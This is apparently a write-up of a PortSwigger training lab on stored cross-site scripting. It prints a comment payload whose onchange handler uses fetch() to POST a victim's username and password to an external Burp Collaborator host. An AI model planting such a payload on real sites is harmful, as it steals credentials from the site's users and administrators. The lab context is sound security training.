# XSS - Exploiting cross-site scripting to capture passwords

## 📌 Lab Details
- **Title**: Exploiting cross-site scripting to capture passwords
- **Difficulty**: Practitioner
- **Category**: Cross-site Scripting
- **Lab URL**: https://portswigger.net/academy/labs/launch/08d9e37603cfe2ef7cf8a21c19e9fc73e81bb5d992fe2e876f8b6891b1759d43?referrer=%2fweb-security%2fcross-site-scripting%2fexploiting%2flab-capturing-passwords

## 🔍 Summary
This lab demonstrates a **stored XSS vulnerability** in blog comments. By injecting a malicious script into a comment, you can capture a victim's **username and password** when they view the comment and type into a form.

## 🛠 Steps to Solve
1. Open **Burp Collaborator** and copy the URL: `536tj2r9cz9okg21aaigqf9r4ia9y0mp.oastify.com`.
2. Inject the exploit comment:
   ```sh
   <input name=username id=username>
   <input type=password name=password  onchange="if(this.value.length)fetch('https://536tj2r9cz9okg21aaigqf9r4ia9y0mp.oastify.com',{
   method: 'POST',
   mode: 'no-cors',
   body: username.value+':'+this.value
   });">
3. Once the admin loads the comment, the script runs in their browser.
4. Click **Poll now** in the Burp Collaborator.
5. Use the admin's **user id and password** to log in.

## 📖 Key Takeaways
- You can **exfiltrate sensitive data** like credentials using `fetch()` and an external server.
- **Burp Collaborator** helps detect when a victim's browser makes a request to your server.
- Script-based attacks can be embedded in form inputs and triggered using event handlers like `onchange`.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/4f576e1e-e3e3-4f40-8fee-50e79a4de1bc)
![image](https://github.com/user-attachments/assets/0e49acec-5f8a-44ed-a329-c51f33e2a810)
![image](https://github.com/user-attachments/assets/a2fb02ab-774a-4a18-a462-d9be53de92c6)
![image](https://github.com/user-attachments/assets/c5a1763d-daa4-47fd-873b-bea2eb933581)
